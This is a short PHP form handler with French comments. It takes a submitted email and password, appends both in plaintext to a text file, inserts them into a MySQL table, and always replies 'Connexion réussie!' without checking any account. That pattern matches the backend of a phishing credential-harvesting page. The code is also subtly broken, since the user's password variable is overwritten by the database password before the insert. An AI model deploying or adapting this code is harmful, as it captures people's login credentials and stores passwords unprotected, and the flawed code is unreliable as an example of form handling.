<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Stockez les informations dans un fichier
    $data = "Email: $email\nMot de passe: $password\n\n";
    file_put_contents('connexion_data.txt', $data, FILE_APPEND | LOCK_EX);

    // Enregistrez également les informations dans une base de données (exemple avec MySQL)
    $servername = "localhost";
    $username = "votre_nom_utilisateur";
    $password = "votre_mot_de_passe_bdd";
    $dbname = "votre_base_de_donnees";

    try {
        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $conn->prepare("INSERT INTO connexions (email, password) VALUES (:email, :password)");
        $stmt->bindParam(':email', $email);
        $stmt->bindParam(':password', $password);
        $stmt->execute();
    } catch(PDOException $e) {
        echo "Erreur: " . $e->getMessage();
    }

    echo "Connexion réussie!";
} else {
    echo "Méthode de requête invalide.";
}
?>